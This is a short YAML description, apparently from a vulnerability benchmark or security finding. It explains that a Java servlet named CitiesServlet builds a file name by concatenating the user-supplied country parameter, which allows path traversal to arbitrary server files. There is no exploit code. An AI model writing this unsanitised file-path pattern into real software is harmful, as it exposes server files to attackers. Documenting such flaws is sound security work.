  description: |
    servlet called "CitiesServlet" that handles HTTP GET requests, so the user-provided input, obtained from the country parameter, is directly concatenated with the "/cities/cities_" string to form the fileName, This means an attacker can manipulate the country parameter and potentially access arbitrary files on the server's file system
